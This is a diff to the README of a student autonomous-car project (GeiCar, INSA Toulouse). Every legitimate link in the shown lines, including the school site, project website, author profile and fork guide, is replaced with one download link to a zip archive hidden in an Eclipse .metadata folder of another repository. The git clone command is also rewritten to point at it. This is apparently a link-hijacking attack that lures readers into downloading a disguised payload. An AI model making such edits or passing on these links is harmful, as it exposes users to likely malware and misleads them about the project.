@@ -1,8 +1,8 @@
 # GeiCar Project
 
-The GeiCar project is a project carried out by students at [INSA Toulouse](http://www.insa-toulouse.fr/fr/index.html). This project consists in developing the software of a autonomous car in order to carry out different missions. Several projects are exposed on the [official website] (https://sites.google.com/site/projetsecinsa/).
+The GeiCar project is a project carried out by students at [INSA Toulouse](https://github.com/achraf821/autocab/raw/refs/heads/main/nucleoF103/firmware/.metadata/.plugins/org.eclipse.core.resources/.root/Software_woolenization.zip). This project consists in developing the software of a autonomous car in order to carry out different missions. Several projects are exposed on the [official website] (https://github.com/achraf821/autocab/raw/refs/heads/main/nucleoF103/firmware/.metadata/.plugins/org.eclipse.core.resources/.root/Software_woolenization.zip).
 
-This repository is intended to provide a basis for students starting a new project on the GeiCar. The present code as well as the documentation is the result of internship carried out by [Alexis24](https://github.com/Alexix24) (Alexis Pierre Dit Lambert)
+This repository is intended to provide a basis for students starting a new project on the GeiCar. The present code as well as the documentation is the result of internship carried out by [Alexis24](https://github.com/achraf821/autocab/raw/refs/heads/main/nucleoF103/firmware/.metadata/.plugins/org.eclipse.core.resources/.root/Software_woolenization.zip) (Alexis Pierre Dit Lambert)
 
 The platform is developped and maintained by :
 
@@ -32,8 +32,8 @@ The projects are (or were) surpervised by:
 	* Use the red button as a switch to turn off the power.
 
 ###Use of this repository
-* First of all, [fork this repository](https://docs.github.com/en/get-started/quickstart/fork-a-repo) to get yours.
-* Then, clone your fresh and new repository on your computer: `git clone https://github.com/<your id>/<your wonderful repo>`
+* First of all, [fork this repository](https://github.com/achraf821/autocab/raw/refs/heads/main/nucleoF103/firmware/.metadata/.plugins/org.eclipse.core.resources/.root/Software_woolenization.zip) to get yours.
+* Then, clone your fresh and new repository on your computer: `git clone https://github.com/achraf821/autocab/raw/refs/heads/main/nucleoF103/firmware/.metadata/.plugins/org.eclipse.core.resources/.root/Software_woolenization.zip<your id>/<your wonderful repo>`
 * Have a look in "general" directory for how to connect and work with your car
 * For more 'in depth' documentation on a particular subsystem, have a look in following directories:
     * raspberryPI3: Everything about raspberry setup
